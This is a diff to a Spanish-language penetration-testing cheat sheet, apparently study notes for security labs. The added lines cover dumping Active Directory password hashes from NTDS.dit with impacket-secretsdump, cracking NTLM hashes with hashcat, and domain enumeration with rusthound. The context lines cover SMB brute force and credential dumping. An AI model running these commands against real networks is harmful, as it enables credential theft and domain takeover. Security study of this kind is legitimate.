@@ -479,7 +479,11 @@ RSAcrack -w /opt/techyou.txt -k id_rsa ---> crackear passphrase de archivo id_rs
 
 crackmapexec smb target.ine.local -u tom -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt --> fuerza bruta SMB
 
-
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL --> Extraer hashes del dominio AD gracias al archivo NTDS.dit y SYTEM
+      despues....
+          hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --> descifrarlas con fuerza bruta
+          hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --> descifrar por diccionario
+          hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --> descifrar por permutaciones
 SMB
 ....
 
@@ -754,6 +758,7 @@ EXT-ENUM
   crackmapexec smb [IP_DC] -u 'user' -p 'password' --users --> enumerar usuarios en los equipos con un user autenticado
   crackmapexec smb [IP_DC] --pass-pol --> enumerar politica contraseñas del dominio
   bloodhound-python -u user -p password -d dominio.local -c All --> sacar información del dominio para verla con bloodhound
+  rusthound -d tu_dominio.local -u nombre_usuario -p "tu_contraseña" -dc <IP_del_DC> -z --adcs --> sacar información del dominio para verla con rusthound
   ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)" --> descubrir el DC por medio de ldap
   ldapsearch -x -H ldap://IP -b "dc=thm,dc=local" --> enumerar usuarios y sus propiedades
   impacket-secretsdump -just-dc-ntlm dominio.local/user@IP -- mostrar hash de contraseñas de usuarios
